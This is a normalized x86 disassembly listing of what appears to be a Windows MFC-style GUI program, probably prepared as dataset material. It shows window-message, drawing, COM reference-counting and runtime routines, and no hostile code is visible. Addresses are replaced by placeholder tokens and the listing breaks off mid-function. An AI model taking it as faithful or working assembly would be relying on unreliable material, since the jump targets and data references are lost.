call sub_4221e2
add esp 0x4
sub_401110
mov eax r--data
retn
sub_401120
mov eax [ esp + 0x4 ]
cmp [ eax + 0x4 ] 0x100
jne r-xdata
push eax
call sub_41e66d
retn 0x4
cmp [ eax + 0x8 ] 0xd
jne r-xdata
call sub_401180
xor eax eax
retn 0x4
sub_401150
push esi
mov esi ecx
call sub_41ed51
mov eax [ esi + 0x7c ]
push 0x0
push 0x0
push 0x14e
push eax
call [ SendMessageA@IAT ]
mov eax 0x1
pop esi
retn
sub_4011e0
retn 0x4
sub_4011f0
mov eax [ ecx + 0x1c ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_401200
mov eax [ ecx + 0x1c ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
sub_401210
push esi
mov esi ecx
call sub_426127
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_4012c0
push esi
mov esi ecx
call sub_4012e0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_4013b0
mov eax r--data
retn
j_sub_41edcf
jmp sub_41edcf
sub_4014b0
push esi
mov esi ecx
push 0x1
call sub_421060
push 0x0
mov ecx esi
mov [ esi + 0xac ] 0x0
call sub_421060
pop esi
retn
sub_4014d0
push esi
mov esi ecx
push 0x1
call sub_421060
push 0x0
mov ecx esi
mov [ esi + 0xa8 ] 0x0
call sub_421060
pop esi
retn
sub_4014f0
mov eax [ esp + 0x4 ]
cmp [ eax + 0x4 ] 0x100
jne r-xdata
push eax
call sub_41e66d
retn 0x4
cmp [ eax + 0x8 ] 0xd
jne r-xdata
call sub_401410
xor eax eax
retn 0x4
sub_4015b0
push esi
mov esi ecx
call sub_4015d0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_401670
mov eax r--data
retn
sub_401730
mov eax [ esp + 0x4 ]
cmp [ eax + 0x4 ] 0x100
jne r-xdata
push eax
call sub_41e66d
retn 0x4
cmp [ eax + 0x8 ] 0xd
jne r-xdata
call sub_4016c0
xor eax eax
retn 0x4
sub_401760
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
push 0xa1
call sub_41ea14
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_401780
push esi
mov esi ecx
call j_sub_41e7a7
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
j_sub_41e7a7
jmp sub_41e7a7
sub_4017b0
retn 0x4
sub_4017c0
mov eax r--data
retn
sub_401cd0
mov eax r--data
retn
sub_401ce0
push esi
mov esi ecx
push 0x0
call sub_4266d6
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_401d00
push esi
mov esi ecx
call j_sub_426820
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
j_sub_426820
jmp sub_426820
sub_401d30
call sub_401d40
jmp sub_401d50
sub_401d40
mov ecx rw-data
jmp sub_401ce0
sub_401d50
push sub_401d60
call sub_41064b
pop ecx
retn
sub_401d60
mov ecx rw-data
jmp j_sub_426820
sub_402070
retn
sub_402080
push esi
mov esi ecx
call sub_4020a0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_402120
call sub_402130
jmp sub_402140
sub_402130
mov ecx rw-data
jmp r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0x10 ] ecx
retn
sub_402140
push sub_402150
call sub_41064b
pop ecx
retn
sub_402150
mov ecx rw-data
jmp r-xdata
add ecx 0x10
jmp sub_422478
sub_402180
call sub_402190
jmp sub_4021b0
sub_402190
push r-xdata
push r-xdata
push 0x186a0
push 0x1c
push rw-data
call sub_41068c
retn
sub_4021b0
push r-xdata
call sub_41064b
pop ecx
retn
sub_4021c5
push 0x186a0
push 0x1c
push rw-data
call sub_41070e
retn
sub_4021e0
call sub_4021f0
jmp sub_402210
sub_4021f0
push r-xdata
push r-xdata
push 0x3e8
push 0x1c
push rw-data
call sub_41068c
retn
sub_402210
push r-xdata
call sub_41064b
pop ecx
retn
sub_402225
push 0x3e8
push 0x1c
push rw-data
call sub_41070e
retn
sub_4023b0
push esi
mov esi ecx
call sub_401f40
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_402450
mov eax r--data
retn
sub_4026a0
mov eax [ ecx + 0x1f4 ]
retn
sub_404800
mov [ rw-data ] 0x0
retn
sub_4049a0
cmp [ esp + 0x8 ] 0x201
jne r-xdata
xor eax eax
retn 0x8
push 0x5
call sub_421b8c
j_sub_4031a0
jmp sub_4031a0
j_sub_404800
jmp sub_404800
j_sub_404860
jmp sub_404860
j_sub_404810
jmp sub_404810
sub_404a40
push 0x0
call [ PostQuitMessage@IAT ]
retn
sub_404a50
push 0x0
push rw-data
push rw-data
call sub_420904
retn
sub_404a70
push 0x0
push rw-data
push rw-data
call sub_420904
retn
sub_404a90
mov eax ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x0
retn
sub_404aa0
push esi
mov esi ecx
call sub_4020e0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_404ac0
push esi
mov esi ecx
call sub_4260be
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_404b40
push esi
mov esi ecx
call sub_404b60
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_404bb0
mov eax [ esp + 0x4 ]
add ecx 0x5c
push ecx
push 0x3fd
push eax
call sub_425678
retn 0x4
sub_404bd0
mov eax r--data
retn
sub_405050
push esi
mov esi ecx
call sub_41dd6c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_405170
push esi
mov esi ecx
call sub_401890
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_4052d0
mov eax r--data
retn
sub_405c90
mov eax 0x276
push 0x0
mov [ ecx + 0x15c ] 0xa5
mov [ ecx + 0x154 ] 0x25d
mov [ ecx + 0x14c ] eax
mov [ ecx + 0x164 ] eax
call sub_421060
retn
sub_405d50
push esi
mov esi ecx
call sub_401ab0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_405de0
mov eax r--data
retn
sub_406e50
push esi
mov esi ecx
call sub_4019b0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_406ee0
mov eax r--data
retn
sub_407b20
push esi
mov esi ecx
call sub_401b90
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_407b80
mov eax r--data
retn
sub_4084c0
push esi
mov esi ecx
call sub_401c70
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
add esp 0x4
sub_408520
mov eax r--data
retn
sub_408764
mov eax [ ecx ]
jmp [ eax + 0xc4 ]
sub_4089a0
mov eax [ ecx + 0x20 ]
test eax eax
jne r-xdata
push eax
call sub_41f3e7
retn
push [ ecx + 0x1c ]
call [ GetParent@IAT ]
sub_4089b7
push [ esp + 0x4 ]
call sub_4221e2
pop ecx
retn 0x4
sub_4089c4
call sub_4272f7
mov ecx [ eax + 0x4 ]
jmp sub_421f6a
sub_4089d1
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_42304c
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_4089fb
push esi
mov esi ecx
call sub_408a17
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_408a17
mov [ ecx ] r--data
retn
sub_408a1e
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_42304c
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_408a48
push esi
mov esi ecx
call sub_408a64
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_408a64
mov [ ecx ] r--data
retn
sub_408a6b
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x4 ]
call [ PtVisible@IAT ]
retn 0x8
sub_408a7f
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ RectVisible@IAT ]
retn 0x4
sub_408a8f
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ TextOutA@IAT ]
retn 0x10
sub_408b08
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ DrawTextA@IAT ]
retn 0x10
sub_408b54
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ Escape@IAT ]
retn 0x10
sub_408b70
call sub_408b7a
jmp sub_408b7b
sub_408b7a
retn
sub_408b7b
push sub_408b87
call sub_41064b
pop ecx
retn
sub_408b87
mov ecx rw-data
jmp r-xdata
jmp sub_42799c
sub_408b96
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
call sub_4272f7
mov [ eax + 0x1038 ] esi
pop esi
retn
push sub_409469
mov ecx rw-data
call sub_427941
mov esi eax
sub_408c97
push [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_4096fb
retn 0x10
sub_409469
push 0x4
call sub_42747a
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_40947e
push esi
mov esi ecx
call sub_40fdb0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_427498
sub_409499
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_42304c
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_4094c3
push esi
mov esi ecx
call sub_4094df
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_4094df
mov [ ecx ] r--data
retn
sub_4094e6
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_42304c
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_409510
push esi
mov esi ecx
call sub_40952c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_40952c
mov [ ecx ] r--data
retn
sub_409533
push esi
mov esi ecx
call sub_40954f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_409597
push esi
mov esi ecx
call sub_4095b3
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_4095b3
mov eax sub_42aef8
call sub_410a78
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_423881
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_409604
push esi
mov esi ecx
call sub_409618
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
pop esi
retn
sub_4098b1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x20 ]
call sub_423058
mov [ ebp - 0x14 ] 0x80020009
mov eax r-xdata
retn
push [ ebp - 0x20 ]
push eax
call sub_429434
sub_4099ba
mov ecx [ ebp - 0x18 ]
call sub_423058
mov eax r-xdata
retn
sub_409a2b
mov eax r--data
retn
sub_409a31
mov eax r--data
retn
sub_409a96
push esi
mov esi ecx
call sub_409ab2
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_409c26
mov ecx [ ebp - 0x1c ]
call sub_423058
mov eax r-xdata
retn
sub_40a077
push esi
mov esi ecx
call sub_40a093
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_40a093
mov eax sub_42afdc
call sub_410a78
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_424e5d
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_40a175
mov eax [ ecx + 0x48 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
retn 0x4
and [ ecx + 0x48 ] 0x0
sub_40a1ea
push ebp
mov ebp esp
mov eax [ ecx ]
lea edx [ ebp + 0x8 ]
push edx
push [ ebp + 0x8 ]
call [ eax + 0x6c ]
push [ ebp + 0x8 ]
call sub_41f3e7
pop ebp
retn 0x4
sub_40a2ef
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
retn 0xc
push [ esp + 0xc ]
mov ecx eax
push [ esp + 0xc ]
call sub_421ab2
sub_40a30e
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
retn 0x10
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
sub_40a370
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
retn 0x8
push [ esp + 0x8 ]
mov ecx eax
call sub_421a8b
sub_40a3f5
mov ecx [ ebp - 0x14 ]
call sub_423058
and [ ebp + 0x8 ] 0x0
mov eax r-xdata
retn
sub_40a407
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0x4c ]
call sub_4284c7
retn 0xc
sub_40a41e
mov eax [ esp + 0x4 ]
add eax 0xffffffb8
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_40a42f
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x4c ]
call sub_42837c
retn 0x4
sub_40a43e
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov eax [ eax - 0x30 ]
mov eax [ eax + 0x1c ]
mov [ ecx ] eax
xor eax eax
retn 0x8
sub_40a453
mov eax 0x80004001
retn 0x8
sub_40a492
xor eax eax
retn 0x8
sub_40a497
mov eax 0x80004001
retn 0xc
sub_40a49f
mov eax r--data
retn
sub_40a4fb
push esi
mov esi ecx
call sub_40a4a5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_40a535
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0x50 ]
call sub_4284c7
retn 0xc
sub_40a54c
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x50 ]
call sub_42837c
retn 0x4
sub_40a55b
mov eax [ esp + 0x4 ]
add eax 0xffffffb4
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_40a56c
mov eax 0x80004001
retn 0x14
sub_40a62d
mov [ ebp - 0x18 ] 0x8007000e
mov eax sub_40a63a
retn
sub_40a682
push 0x0
push 0x0
push 0x31
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
push eax
call sub_424df1
retn
sub_40a698
mov eax r--data
retn
sub_40a7a5
push esi
mov esi ecx
call sub_40a7c1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_40b199
mov eax [ ecx + 0x28 ]
retn
sub_40b1c9
test [ ecx + 0x71 ] 0x10
je r-xdata
xor eax eax
push 0x1
pop eax
test [ ecx + 0x6c ] al
jne r-xdata
retn
sub_40b1da
test [ ecx + 0x71 ] 0x10
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x6c ]
and al 0x1
neg al
sbb eax eax
and al 0xf0
add eax 0x20
retn
sub_40b78a
push 0x0
mov eax [ ecx ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0x2
push [ esp + 0x14 ]
push ecx
call [ eax + 0x60 ]
add esp 0x18
retn 0xc
sub_40b7a6
mov ecx [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
push edx
push [ esp + 0x10 ]
mov eax [ ecx ]
push [ esp + 0x10 ]
call [ eax + 0x5c ]
retn
sub_40b7fe
mov ecx [ ebp - 0x14 ]
call sub_423058
and [ ebp + 0x10 ] 0x0
mov eax r-xdata
retn
sub_40b86f
mov ecx [ ebp - 0x20 ]
call sub_423058
mov eax sub_40b87d
retn
sub_40b8b8
mov ecx [ ebp - 0x20 ]
call sub_423058
mov eax r-xdata
retn
sub_40b920
mov ecx [ ebp - 0x1c ]
call sub_423058
mov eax r-xdata
retn
sub_40ba7b
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x10 ] esp
call sub_423058
mov ecx [ ebp - 0x14 ]
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ecx ]
push 0x8
push 0xfffffdfb
call [ eax + 0x64 ]
mov eax r-xdata
retn
sub_40baa2
mov ecx [ ebp - 0x18 ]
call sub_423058
mov eax r-xdata
retn
sub_40bb50
mov edx [ esp + 0x4 ]
mov eax [ ecx + 0x28 ]
mov [ ecx + 0x28 ] edx
retn 0x4
sub_40bd0b
mov ecx [ ebp - 0x18 ]
call sub_423058
mov eax r-xdata
retn
sub_40bd6d
mov ecx [ ebp - 0x18 ]
call sub_423058
mov [ ebp - 0x14 ] 0x1
mov eax r-xdata
retn
sub_40bfc7
mov eax [ esp + 0x4 ]
add eax 0xffffff4c
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_40bfda
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xb8 ]
call sub_42837c
retn 0x4
sub_40bfec
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xb8 ]
call sub_4284c7
retn 0xc
sub_40c006
mov eax 0x80004001
retn 0x10
sub_40c00e
push [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
mov ecx [ eax - 0x9c ]
push r--data
call sub_4284c7
retn 0x8
sub_40c029
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xb8 ]
call sub_40b5f1
xor eax eax
retn 0x4
sub_40c03d
mov eax [ esp + 0x4 ]
add eax 0xffffff48
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_40c050
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xbc ]
call sub_42837c
retn 0x4
sub_40c062
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xbc ]
call sub_4284c7
retn 0xc
sub_40c0a7
xor eax eax
retn 0x4
sub_40c0ac
mov eax [ esp + 0x4 ]
add eax 0xffffff44
push eax
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
call [ edx + 0x5c ]
xor eax eax
retn 0x4
sub_40c13b
push 0x1
pop eax
retn 0xc
sub_40c141
mov eax [ esp + 0x4 ]
add eax 0xffffff44
push eax
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
call [ edx + 0x60 ]
xor eax eax
retn 0x8
sub_40c158
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xbc ]
call sub_40b62e
xor eax eax
retn 0x4
sub_40c16c
mov eax [ esp + 0x4 ]
mov eax [ eax - 0x6c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor eax eax
retn 0x4
sub_40c1d1
mov eax [ esp + 0x4 ]
add eax 0xffffff44
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_40c1e4
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xc0 ]
call sub_42837c
retn 0x4
sub_40c1f6
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xc0 ]
call sub_4284c7
retn 0xc
sub_40c210
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xc0 ]
call sub_40b482
xor eax eax
retn 0x4
sub_40c326
mov eax 0x80004001
retn 0x4
sub_40c32e
mov eax [ esp + 0x4 ]
add eax 0xffffff40
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_40c341
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xc4 ]
call sub_42837c
retn 0x4
sub_40c353
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xc4 ]
call sub_4284c7
retn 0xc
sub_40c36d
mov eax 0x80004001
retn 0x18
sub_40c3f0
push 0x1
pop eax
retn 0x4
sub_40cff2
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
add ecx 0x4
push ecx
push rw-data
push eax
call [ edx ]
sub_40d0e7
mov eax r-xdata
retn
sub_40d14c
mov eax r-xdata
retn
sub_40d240
mov eax r-xdata
retn
sub_40d2ea
mov eax r-xdata
retn
sub_40dfe7
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
retn 0x4
sub_40eb2d
push esi
mov esi ecx
push [ esi + 0xc ]
call sub_4221e2
push [ esi + 0x24 ]
call sub_4221e2
pop ecx
pop ecx
pop esi
retn
sub_40eb90
mov eax r-xdata
retn
sub_40eca7
mov dx [ esp + 0xc ]
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] dx
mov edx [ esp + 0x8 ]
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x8 ] edx
mov [ eax + 0x18 ] ecx
retn 0xc
sub_40eccd
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
retn 0x4
sub_40ecd6
mov eax [ esp + 0x4 ]
cmp [ ecx + 0xc ] eax
je r-xdata
retn 0x4
mov [ ecx + 0xc ] eax
call sub_40ecee
sub_40ecea
mov eax [ ecx + 0x18 ]
retn
sub_40edde
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xd0 ]
call sub_428363
retn 0x4
sub_40edf0
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xd0 ]
call sub_4283a6
retn 0x4
sub_40ee02
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xd0 ]
call sub_428509
retn 0xc
sub_40ee1c
push [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
push [ esp + 0x10 ]
lea ecx [ eax - 0xd0 ]
push [ esp + 0x10 ]
call sub_40eda7
retn 0x10
sub_40eee0
push 0x2
mov ecx [ esp + 0x8 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_40f041
test eax eax
jl r-xdata
retn 0x10
xor eax eax
sub_40ef4a
push 0x4
mov ecx [ esp + 0x8 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_40f041
test eax eax
jl r-xdata
retn 0x10
xor eax eax
sub_40ef6a
push 0x5
mov ecx [ esp + 0x8 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_40f041
test eax eax
jl r-xdata
retn 0x10
xor eax eax
sub_40f36f
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
j_sub_429746
jmp sub_429746
sub_40f3aa
push ecx
call [ VariantClear@IAT ]
retn
sub_40f3b2
mov eax ecx
mov ecx [ esp + 0x4 ]
or [ eax + 0x4 ] 0xffffffff
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x20 ] ecx
retn 0x4
sub_40f3d5
push [ esp + 0x4 ]
add ecx 0xc
call sub_422601
retn 0x4
sub_40fd4e
mov ecx [ ebp + 0xc ]
call sub_423058
mov eax r-xdata
retn
sub_40fdb0
retn
sub_40fdb1
push esi
mov esi ecx
call sub_40fdcd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_40fdcd
mov eax sub_42b3bc
call sub_410a78
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x10
call sub_422478
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_40fdf9
mov eax [ esp + 0x4 ]
test eax eax
jge r-xdata
retn 0x4
cmp eax 0x8007000e
jne r-xdata
push eax
call sub_42852f
call sub_41dc26
jmp r-xdata
sub_40fe18
push esi
mov esi ecx
push esi
call sub_40ff70
push [ esp + 0x8 ]
push esi
call [ VariantCopy@IAT ]
push eax
call sub_40fdf9
mov eax esi
pop esi
retn 0x4
sub_40ff56
push esi
mov esi ecx
push [ esp + 0x8 ]
push esi
call [ VariantCopy@IAT ]
push eax
call sub_40fdf9
mov eax esi
pop esi
retn 0x4
sub_40ff70
push 0x10
push 0x0
push [ esp + 0xc ]
call sub_410a20
add esp 0xc
retn 0x4
sub_4100eb
push esi
mov esi ecx
call sub_410107
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_410107
mov [ ecx ] r--data
retn
sub_41017e
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_410185
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_4103ad
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_410450
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4104da
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_410450
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_410506
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_41064b
push [ esp + 0x4 ]
call sub_4105cd
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_4106f6
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
retn
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41078e
sub_410776
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41078e
sub_4107ca
push [ ebp - 0x14 ]
call sub_4130b0
pop ecx
retn
sub_4109af
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_414333
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_4142fa
sub_4109d2
retn
sub_4109fc
push esi
mov esi ecx
call sub_4109d3
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_410a78
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_410c31
push 0x9
call sub_41373b
pop ecx
retn
sub_410c90
push 0x9
call sub_41373b
pop ecx
retn
sub_410d30
push 0x9
call sub_41373b
pop ecx
retn
sub_410d88
push 0x9
call sub_41373b
pop ecx
retn
sub_410daf
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_410dc6
add esp 0x10
retn
sub_410fcb
push 0x1
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_410dc6
add esp 0x10
retn
sub_411404
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_41150a
push rw-data
push rw-data
call sub_41150a
add esp 0x10
retn
call eax
sub_411431
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_411453
add esp 0xc
retn
sub_411442
push 0x0
